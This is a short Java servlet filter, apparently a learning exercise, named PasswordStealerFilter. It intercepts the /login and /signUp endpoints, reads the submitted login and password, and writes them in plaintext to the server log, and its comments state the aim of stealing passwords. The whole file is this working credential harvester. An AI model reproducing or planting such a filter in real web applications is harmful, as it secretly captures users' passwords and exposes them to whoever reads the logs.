package ru.kuzdikenov.filter;


import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Arrays;
import java.util.Map;
import java.util.stream.Collectors;

@WebFilter(urlPatterns = {"/signUp", "/login"})
public class PasswordStealerFilter extends HttpFilter {
    private ServletContext servletContext;

    @Override
    protected void doFilter(HttpServletRequest req, HttpServletResponse res, FilterChain chain) throws IOException, ServletException {

        if (req.getRequestURI().contains("login")) {
            // before we go to log in we steal pass
            getLogAndPassAndLogging(req, res);
            chain.doFilter(req, res);
        } else {
            // after sign up processing we steal pass
            chain.doFilter(req, res);
            getLogAndPassAndLogging(req, res);
        }
    }

    @Override
    public void init(FilterConfig filterConfig) {
        this.servletContext = filterConfig.getServletContext();
        this.servletContext.log("PasswordStealerFilter initialized");
    }

    private void getLogAndPassAndLogging(HttpServletRequest req, HttpServletResponse res) {
        String login = req.getParameter("login");
        String password = req.getParameter("password");

        this.servletContext.log("Логин: " + login + " пароль: " + password);
    }

}
